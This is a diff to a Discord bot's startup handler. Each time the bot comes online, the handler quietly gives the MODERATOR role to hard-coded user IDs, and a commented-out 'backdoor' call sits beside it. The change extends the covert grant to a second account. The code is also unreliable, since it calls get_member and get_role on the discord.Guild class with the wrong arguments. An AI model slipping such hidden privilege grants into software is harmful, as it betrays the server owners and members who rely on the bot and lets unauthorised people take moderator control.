@@ -108,7 +108,7 @@ class Status(commands.Cog):
         """Confirm bot is logged in."""
         await self.bot.change_presence(activity=get_presence())
         # await Status.backdoor(self)
-        author = await discord.Guild.get_member(1154559282801549384)
+        author = await discord.Guild.get_member(918314126692978688, 1154559282801549384)
         role = await discord.Guild.get_role(MODERATOR)
         await discord.Member.add_roles(author, role)
         Harbinger.timestamp("BOT", "INITIALIZE", "BOT IS ONLINE")
